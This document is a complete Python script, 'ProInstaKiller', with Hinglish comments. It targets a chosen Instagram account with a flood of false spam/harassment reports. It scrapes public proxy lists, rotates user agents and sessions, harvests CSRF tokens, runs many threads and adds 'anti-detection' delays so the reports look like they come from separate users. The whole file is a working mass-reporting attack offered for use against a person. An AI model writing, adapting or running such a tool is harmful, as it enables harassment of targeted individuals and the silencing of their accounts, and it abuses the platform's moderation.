#!/usr/bin/env python3
import requests
import random
import time
import threading
import json
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

class ProInstaKiller:
    def __init__(self, target, intensity):
        self.target = target
        self.intensity = intensity
        self.ua = UserAgent()
        self.proxies = []
        self.kills = 0
        self.lock = threading.Lock()
        
    def fetch_elite_proxies(self):
        """Internet se automatically fresh proxies nikaalne ka system"""
        print("📡 Fetching fresh elite proxies...")
        api_url = "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        try:
            resp = requests.get(api_url, timeout=10)
            if resp.status_code == 200:
                raw_proxies = resp.text.split('\r\n')
                self.proxies = [f"http://{p}" for p in raw_proxies if ":" in p]
                print(f"✅ Loaded {len(self.proxies)} fresh proxies.")
            else:
                self.proxies = ["http://20.210.113.32:80", "http://154.3.8.30:5664"] # Fallback
        except:
            print("⚠️ API down, using fallback proxies.")
            self.proxies = ["http://20.210.113.32:80"]

    def get_csrf_and_session(self, proxy):
        """Har request se pehle naya session aur token lena"""
        session = requests.Session()
        session.proxies = {'http': proxy, 'https': proxy}
        headers = {'User-Agent': self.ua.random}
        try:
            # Step 1: Visit profile to get cookies
            resp = session.get(f"https://www.instagram.com/{self.target}/", headers=headers, timeout=10)
            token = session.cookies.get('csrftoken')
            return session, token
        except:
            return None, None

    def execute_attack(self, proxy):
        """Professional Attack logic"""
        session, token = self.get_csrf_and_session(proxy)
        if not session or not token:
            return False

        headers = {
            'User-Agent': self.ua.random,
            'X-CSRFToken': token,
            'X-Instagram-Ajax': '1',
            'Referer': f'https://www.instagram.com/{self.target}/',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        # Instagram 2026 Reporting Payload
        payload = {
            'source_object_id': self.target,
            'reason_id': '1', # Spam/Harassment
            'source_name': 'profile'
        }

        try:
            resp = session.post(
                "https://www.instagram.com/ajax/account/user_reports/",
                data=payload,
                headers=headers,
                timeout=12
            )
            if resp.status_code == 200:
                with self.lock:
                    self.kills += 1
                    print(f"💀 SUCCESS | Report #{self.kills} | Status: 200")
                return True
        except:
            pass
        return False

    def start_mission(self):
        self.fetch_elite_proxies()
        threads = self.intensity * 2 # 4GB RAM ke liye safe scaling
        total_attacks = self.intensity * 10
        
        print(f"🚀 MISSION START | Target: @{self.target} | Threads: {threads}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(total_attacks):
                if not self.proxies: break
                proxy = random.choice(self.proxies)
                executor.submit(self.execute_attack, proxy)
                time.sleep(random.uniform(1, 3)) # Anti-detection delay

        print(f"\n✅ MISSION OVER! Total Success Kills: {self.kills}")

if __name__ == "__main__":
    target_user = input("[?] Enter Target: ")
    power = int(input("[?] Intensity (1-10): "))
    
    killer = ProInstaKiller(target_user, power)
    killer.start_mission()
